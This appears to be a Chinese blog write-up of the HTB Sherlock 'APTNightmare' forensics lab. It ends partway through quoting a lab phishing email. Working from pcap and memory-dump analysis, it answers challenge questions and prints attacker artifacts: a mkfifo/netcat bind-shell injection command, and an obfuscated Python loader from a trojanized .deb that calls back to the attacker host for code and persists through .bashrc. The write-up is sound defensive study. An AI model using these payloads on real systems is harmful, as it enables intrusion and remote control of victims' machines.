+        <img src="/wpimages/2025/Sherlocks/APTNightmare/background.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        【Sherlocks】APTNightmare
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2025-02-27T07:08:03.000Z" itemprop="datePublished">2025-02-27</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/forensic/">forensic</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            19k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><h3 id="What-is-the-IP-address-of-the-infected-web-server"><a href="#What-is-the-IP-address-of-the-infected-web-server" class="headerlink" title="What is the IP address of the infected web server?"></a>What is the IP address of the infected web server?</h3><p>直接找nmap相关流量，然后追一个包。</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-1.png" alt="alt text"></p>
+<blockquote>
+<p>192.168.1.3</p>
+</blockquote>
+<h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><h3 id="What-is-the-IP-address-of-the-Attacker"><a href="#What-is-the-IP-address-of-the-Attacker" class="headerlink" title="What is the IP address of the Attacker?"></a>What is the IP address of the Attacker?</h3><p>同Task1</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-2.png" alt="alt text"></p>
+<blockquote>
+<p>192.168.1.5</p>
+</blockquote>
+<h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><h3 id="How-many-open-ports-were-discovered-by-the-attacker"><a href="#How-many-open-ports-were-discovered-by-the-attacker" class="headerlink" title="How many open ports were discovered by the attacker?"></a>How many open ports were discovered by the attacker?</h3><p>先找到nmap的扫描包段</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-3.png" alt="alt text"></p>
+<p>观察扫描成功的包和失败的包之间的差异，<code>(((ip.src == 192.168.1.5)) &amp;&amp; (tcp.completeness == 39)) &amp;&amp; (tcp.flags == 0x0002)</code>，而后过滤得到所有成功的端口。</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-4.png" alt="alt text"></p>
+<blockquote>
+<p>14</p>
+</blockquote>
+<h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><h3 id="What-are-the-first-five-ports-identified-by-the-attacker-in-numerical-order-during-the-enumeration-phase-not-considering-the-sequence-of-their-discovery"><a href="#What-are-the-first-five-ports-identified-by-the-attacker-in-numerical-order-during-the-enumeration-phase-not-considering-the-sequence-of-their-discovery" class="headerlink" title="What are the first five ports identified by the attacker in numerical order during the enumeration phase, not considering the sequence of their discovery?"></a>What are the first five ports identified by the attacker in numerical order during the enumeration phase, not considering the sequence of their discovery?</h3><p>把上面的端口排序之后取前5个。</p>
+<blockquote>
+<p>25,53,80,110,119</p>
+</blockquote>
+<h2 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h2><h3 id="The-attacker-exploited-a-misconfiguration-allowing-them-to-enumerate-all-subdomains-What-is-the-method-used-commonly-referred-to-as-e-g-Unrestricted-Access-Controls"><a href="#The-attacker-exploited-a-misconfiguration-allowing-them-to-enumerate-all-subdomains-What-is-the-method-used-commonly-referred-to-as-e-g-Unrestricted-Access-Controls" class="headerlink" title="The attacker exploited a misconfiguration allowing them to enumerate all subdomains. What is the method used commonly referred to as (e.g, Unrestricted Access Controls)?"></a>The attacker exploited a misconfiguration allowing them to enumerate all subdomains. What is the method used commonly referred to as (e.g, Unrestricted Access Controls)?</h3><p>直接搜53口，能看到是axfr获取的。</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-5.png" alt="alt text"></p>
+<blockquote>
+<p>DNS Zone Transfer</p>
+</blockquote>
+<h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><h3 id="How-many-subdomains-were-discovered-by-the-attacker"><a href="#How-many-subdomains-were-discovered-by-the-attacker" class="headerlink" title="How many subdomains were discovered by the attacker?"></a>How many subdomains were discovered by the attacker?</h3><p>上图的子域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br><span class="line">auth.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br><span class="line">www.a1.dev.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br><span class="line">download.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br><span class="line">ftp.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br><span class="line">internal.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br><span class="line">mail.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br><span class="line">office.cs-corp.cd: type TXT, class IN</span><br><span class="line">sysmon.cs-corp.cd: type A, class IN, addr 192.168.1.3</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>9</p>
+</blockquote>
+<h2 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h2><h3 id="What-is-the-compromised-subdomain-e-g-dev-example-com"><a href="#What-is-the-compromised-subdomain-e-g-dev-example-com" class="headerlink" title="What is the compromised subdomain (e.g., dev.example.com) ?"></a>What is the compromised subdomain (e.g., dev.example.com) ?</h3><p>挨个域名看，最后<code>sysmon.cs-corp.cd</code>的包明显更多</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-6.png" alt="alt text"></p>
+<blockquote>
+<p>sysmon.cs-corp.cd</p>
+</blockquote>
+<h2 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h2><h3 id="What-username-and-password-were-used-to-log-in"><a href="#What-username-and-password-were-used-to-log-in" class="headerlink" title="What username and password were used to log in?"></a>What username and password were used to log in?</h3><p>直接筛选<code>sysmon.cs-corp.cd</code>看包，得知登陆页传参是<code>index.php</code></p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-7.png" alt="alt text"></p>
+<p>随便选一个请求包观察来回请求</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-8.png" alt="alt text"></p>
+<p>这包的客户端password部分是个sqli的payload</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-9.png" alt="alt text"></p>
+<p>没登陆成功但是服务器也会返回200，返回的body部分会包含<code>Invalid username or password</code>字样</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-10.png" alt="alt text"></p>
+<p>所以只过滤掉服务器回包的这个字段的包就可以，这里先匹配一下对应路径返回包</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-11.png" alt="alt text"></p>
+<p>然后找个body是登陆失败的加个过滤条件，就得到一个302</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-12.png" alt="alt text"></p>
+<p>追流看到登陆成功包</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-13.png" alt="alt text"></p>
+<p>密码解码一下</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-14.png" alt="alt text"></p>
+<blockquote>
+<p>admin:Pass@000_</p>
+</blockquote>
+<h2 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h2><h3 id="What-command-gave-the-attacker-their-initial-access"><a href="#What-command-gave-the-attacker-their-initial-access" class="headerlink" title="What command gave the attacker their initial access ?"></a>What command gave the attacker their initial access ?</h3><p>因为应该是后台漏洞，所以过滤dashboard</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-15.png" alt="alt text"></p>
+<blockquote>
+<p>|mkfifo &#x2F;tmp&#x2F;mypipe;cat &#x2F;tmp&#x2F;mypipe|&#x2F;bin&#x2F;bash|nc -l -p 5555 &gt;&#x2F;tmp&#x2F;mypipe</p>
+</blockquote>
+<h2 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h2><h3 id="What-is-the-CVE-identifier-for-the-vulnerability-that-the-attacker-exploited-to-achieve-privilege-escalation-e-g-CVE-2016-5195"><a href="#What-is-the-CVE-identifier-for-the-vulnerability-that-the-attacker-exploited-to-achieve-privilege-escalation-e-g-CVE-2016-5195" class="headerlink" title="What is the CVE identifier for the vulnerability that the attacker exploited to achieve privilege escalation (e.g, CVE-2016-5195) ?"></a>What is the CVE identifier for the vulnerability that the attacker exploited to achieve privilege escalation (e.g, CVE-2016-5195) ?</h3><p>直接筛选<code>tcp.port = 5555</code>追流看他反弹的shell。</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-16.png" alt="alt text"></p>
+<p>看到pwnkit就知道了</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-17.png" alt="alt text"></p>
+<blockquote>
+<p>CVE-2021-4034</p>
+</blockquote>
+<h2 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h2><h3 id="What-is-the-MITRE-ID-of-the-technique-used-by-the-attacker-to-achieve-persistence-e-g-T1098-001"><a href="#What-is-the-MITRE-ID-of-the-technique-used-by-the-attacker-to-achieve-persistence-e-g-T1098-001" class="headerlink" title="What is the MITRE ID of the technique used by the attacker to achieve persistence (e.g, T1098.001)?"></a>What is the MITRE ID of the technique used by the attacker to achieve persistence (e.g, T1098.001)?</h3><p>还是这个http流里，他是加了个定时任务做维权</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-18.png" alt="alt text"></p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-19.png" alt="alt text"></p>
+<blockquote>
+<p>T1053.003</p>
+</blockquote>
+<h2 id="Task-12"><a href="#Task-12" class="headerlink" title="Task 12"></a>Task 12</h2><h3 id="The-attacker-tampered-with-the-software-hosted-on-the-‘download’-subdomain-with-the-intent-of-gaining-access-to-end-users-What-is-the-Mitre-ATT-CK-technique-ID-for-this-attack"><a href="#The-attacker-tampered-with-the-software-hosted-on-the-‘download’-subdomain-with-the-intent-of-gaining-access-to-end-users-What-is-the-Mitre-ATT-CK-technique-ID-for-this-attack" class="headerlink" title="The attacker tampered with the software hosted on the ‘download’ subdomain with the intent of gaining access to end-users. What is the Mitre ATT&amp;CK technique ID for this attack?"></a>The attacker tampered with the software hosted on the ‘download’ subdomain with the intent of gaining access to end-users. What is the Mitre ATT&amp;CK technique ID for this attack?</h3><p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-20.png" alt="alt text"></p>
+<blockquote>
+<p>T1195.002</p>
+</blockquote>
+<h2 id="Task-13"><a href="#Task-13" class="headerlink" title="Task 13"></a>Task 13</h2><h3 id="What-command-provided-persistence-in-the-cs-linux-deb-file"><a href="#What-command-provided-persistence-in-the-cs-linux-deb-file" class="headerlink" title="What command provided persistence in the cs-linux.deb file?"></a>What command provided persistence in the cs-linux.deb file?</h3><p>这个文件是从<code>192.168.1.5:8000</code>上获取的</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-21.png" alt="alt text"></p>
+<p>所以直接匹配请求路径</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-22.png" alt="alt text"></p>
+<p>追流，把文件导出来，直接<code>ctrl+shift+x</code>选中文件流导出来就完事。</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-23.png" alt="alt text"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ dpkg -X cs-linux.deb cs-linux</span><br><span class="line">./</span><br><span class="line">./usr/</span><br><span class="line">./usr/bin/</span><br><span class="line">./usr/bin/cs-linux</span><br></pre></td></tr></table></figure>
+
+<p>最后有一个py文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> cs-linux </span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(__import__(<span class="string">&#x27;zlib&#x27;</span>).decompress(__import__(<span class="string">&#x27;base64&#x27;</span>).b64decode(__import__(<span class="string">&#x27;codecs&#x27;</span>).getencoder(<span class="string">&#x27;utf-8&#x27;</span>)(<span class="string">&#x27;eJw9UN9LwzAQfl7+irCHNcEsrqMbOmxBxAcRGTjfRKRNT1uaJiWXaqfo325Dh/dwx3f33Xc/6razzlO0qgEvvnRdiCJH2CYCveuVF75uQVgkxKLEI3po2RxUZanCpa5NP9DFgmYZ/T2XY2Pl1JyTN+voQGtDXW7egcUrviMz746jn2E6zZJTYGtxwof9zf3r4enx9vqBB55U1hhQnrEovlzLeHshY7mJRDIaD4zCQd6QGQwKOh+kw6oSNUDHNpzodLpA9qbLVcOi7C4SKB2oDzYKPK9eSJmesObks6o1UA2GlfxKj3Ll2X91OaU5gQEUC0+SJSjbdg4Q2fQvWWyTkCwhMMV3hNEOfzj5Axx7baM=&#x27;</span>)[0])))</span><br></pre></td></tr></table></figure>
+
+<p>zilb压缩之后又base64的，所以用厨子解一下</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-24.png" alt="alt text"></p>
+<p>得到脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import socket,zlib,<span class="built_in">base64</span>,struct,time,os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;echo cs-linux &amp;&amp; &gt;&gt; ~/.bashrc&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(10):</span><br><span class="line">	try:</span><br><span class="line">		s=socket.socket(2,socket.SOCK_STREAM)</span><br><span class="line">		s.connect((&#x27;<span class="number">192.168</span>.<span class="number">1.5</span>&#x27;,<span class="number">4444</span>))</span><br><span class="line">		<span class="built_in">break</span></span><br><span class="line">	except:</span><br><span class="line">		time.sleep(5)</span><br><span class="line">l=struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>,s.recv(4))[0]</span><br><span class="line">d=s.recv(l)</span><br><span class="line"><span class="keyword">while</span> len(d)&lt;l:</span><br><span class="line">	d+=s.recv(l-len(d))</span><br><span class="line"><span class="built_in">exec</span>(zlib.decompress(base64.b64decode(d)),&#123;<span class="string">&#x27;s&#x27;</span>:s&#125;)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>echo cs-linux &amp;&amp; &gt;&gt; ~&#x2F;.bashrc</p>
+</blockquote>
+<h2 id="Task-14"><a href="#Task-14" class="headerlink" title="Task 14"></a>Task 14</h2><h3 id="The-attacker-sent-emails-to-employees-what-is-the-name-of-the-running-process-that-allowed-this-to-occur"><a href="#The-attacker-sent-emails-to-employees-what-is-the-name-of-the-running-process-that-allowed-this-to-occur" class="headerlink" title="The attacker sent emails to employees, what is the name of the running process that allowed this to occur?"></a>The attacker sent emails to employees, what is the name of the running process that allowed this to occur?</h3><p>这里用vol3直接解析mem会有问题，不过题目给了对应的profile直接导一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp Ubuntu_5.3.0-70-generic_profile.zip ~/tools/vol3/volatility3/volatility3/plugins/linux/.</span><br></pre></td></tr></table></figure>
+<p>然后发现跑不起来，找了下资料发现因为他这包里的内容是给vol2用的。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://code.google.com/archive/p/volatility/wikis/LinuxMemoryForensics.wiki">https://code.google.com/archive/p/volatility/wikis/LinuxMemoryForensics.wiki</a></p>
+</blockquote>
+<p>如果要做vol3的需要参考下面的，但是我不想再去装环境了，所以还是用vol2做</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.iblue.team/memory-forensics-1/volatility-plugins/build-custom-linux-profile-for-volatility">https://www.iblue.team/memory-forensics-1/volatility-plugins/build-custom-linux-profile-for-volatility</a></p>
+</blockquote>
+<p>挪到<code>volatility/plugins/overlays/linux/</code>路径下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> Ubuntu_5.3.0-70-generic_profile.zip volatility/plugins/overlays/linux/.</span><br></pre></td></tr></table></figure>
+
+<p>然后info可以看到对应的profile名字，这里是<code>LinuxUbuntu_5_3_0-70-generic_profilex64</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python2 vol.py --info</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1 </span><br><span class="line">Profiles</span><br><span class="line">--------</span><br><span class="line">LinuxUbuntu_5_3_0-70-generic_profilex64 - A Profile for Linux Ubuntu_5.3.0-70-generic_profile x64</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ python2 vol.py -f ~/Desktop/htblue/APTN1ghtm4r3/Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_psaux  </span><br></pre></td></tr></table></figure>
+
+<p>直接看进程里和mail相关的</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-25.png" alt="alt text"></p>
+<blockquote>
+<p>citserver</p>
+</blockquote>
+<h2 id="Task-15"><a href="#Task-15" class="headerlink" title="Task 15"></a>Task 15</h2><h3 id="We-received-a-phishing-email-Provide-the-subject-of-that-email"><a href="#We-received-a-phishing-email-Provide-the-subject-of-that-email" class="headerlink" title="We received a phishing email. Provide the subject of that email."></a>We received a phishing email. Provide the subject of that email.</h3><p>直接根据上个题目的找进程正在使用的相关文件，mail.log不会存有这部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f ~/Desktop/htblue/APTN1ghtm4r3/Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-<span class="number">70</span>-generic_profilex64 linux_lsof -p <span class="number">545</span>                               </span><br><span class="line">Volatility Foundation Volatility Framework <span class="number">2.6</span><span class="number">.1</span> </span><br><span class="line"></span><br><span class="line">Offset             Name                           Pid      FD       Path</span><br><span class="line">------------------ ------------------------------ -------- -------- ----</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">0</span> /dev/null</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">1</span> /dev/null</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">2</span> /dev/null</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">3</span> /run/citadel/citadel.lock</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">4</span> /dev/urandom</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">5</span> /dev/random</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">6</span> /var/lib/citadel/data/cdb<span class="number">.00</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">7</span> /var/lib/citadel/data/cdb<span class="number">.01</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">8</span> /var/lib/citadel/data/cdb<span class="number">.02</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>        <span class="number">9</span> /var/lib/citadel/data/cdb<span class="number">.03</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">10</span> /var/lib/citadel/data/cdb<span class="number">.04</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">11</span> /var/lib/citadel/data/cdb<span class="number">.05</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">12</span> /var/lib/citadel/data/cdb<span class="number">.06</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">13</span> /var/lib/citadel/data/cdb<span class="number">.07</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">14</span> /var/lib/citadel/data/cdb<span class="number">.08</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">15</span> /var/lib/citadel/data/cdb<span class="number">.09</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">16</span> /var/lib/citadel/data/cdb<span class="number">.0</span>a</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">17</span> /var/lib/citadel/data/cdb<span class="number">.0</span>b</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">18</span> /var/lib/citadel/data/cdb<span class="number">.0</span>c</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">19</span> /var/lib/citadel/data/cdb<span class="number">.0</span>d</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">20</span> /var/lib/citadel/data/log<span class="number">.0000000001</span></span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">21</span> socket:[<span class="number">18780</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">22</span> socket:[<span class="number">18781</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">23</span> socket:[<span class="number">18782</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">24</span> socket:[<span class="number">18783</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">25</span> socket:[<span class="number">18784</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">26</span> socket:[<span class="number">18785</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">27</span> socket:[<span class="number">18786</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">28</span> socket:[<span class="number">18787</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">29</span> socket:[<span class="number">18788</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">30</span> socket:[<span class="number">18789</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">31</span> socket:[<span class="number">18790</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">32</span> socket:[<span class="number">18791</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">33</span> socket:[<span class="number">18792</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">34</span> socket:[<span class="number">18793</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">35</span> socket:[<span class="number">18794</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">36</span> socket:[<span class="number">18798</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">38</span> socket:[<span class="number">44457</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">39</span> socket:[<span class="number">86733</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">41</span> socket:[<span class="number">29396</span>]</span><br><span class="line"><span class="number">0xffff9fa43ee10000</span> citserver                           <span class="number">545</span>       <span class="number">42</span> /var/lib/citadel/data/refcount_adjustments.dat</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.alibabacloud.com/blog/how-to-install-citadel-mail-server-on-ubuntu-16-04_594302">https://www.alibabacloud.com/blog/how-to-install-citadel-mail-server-on-ubuntu-16-04_594302</a></p>
+</blockquote>
+<p>获取citadel的日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ python2 vol.py -f ~/Desktop/htblue/APTN1ghtm4r3/Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff9fa43ee10000 -O cdb.log</span><br></pre></td></tr></table></figure>
+
+<p>strings一下，有个压缩包内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Aadmin</span><br><span class="line">O0000000006.Sent Items</span><br><span class="line">Ncs-corp.cd</span><br><span class="line">HCitadel Server</span><br><span class="line">Rceo-ru</span><br><span class="line">UReview Revised Privacy Policy</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">X-Mailer: WebCit 917</span><br><span class="line">Content-type: multipart/mixed; boundary=&quot;Citadel--Multipart--cs-corp.cd--022a--000d&quot;</span><br><span class="line">This is a multipart message in MIME format.</span><br><span class="line">--Citadel--Multipart--cs-corp.cd--022a--000d</span><br><span class="line">Content-type: multipart/alternative; boundary=&quot;Citadel--Multipart--cs-corp.cd--022a--000e&quot;</span><br><span class="line">This is a multipart message in MIME format.</span><br><span class="line">--Citadel--Multipart--cs-corp.cd--022a--000e</span><br><span class="line">Content-type: text/plain; charset=utf-8</span><br><span class="line">Content-Transfer-Encoding: quoted-printable</span><br><span class="line">Dear CEO,=0A=0AI hope this message finds you well. We&#x27;ve drafted our upda=</span><br><span class="line">ted privacy policy=0Aahead of schedule. Please review the attached docume=</span><br><span class="line">nt and share any=0Aobjections or suggestions with HR via email.=0A=0AYour=</span><br><span class="line"> input is valuable=E2=80=94thank you=0A=0AMr.AK, 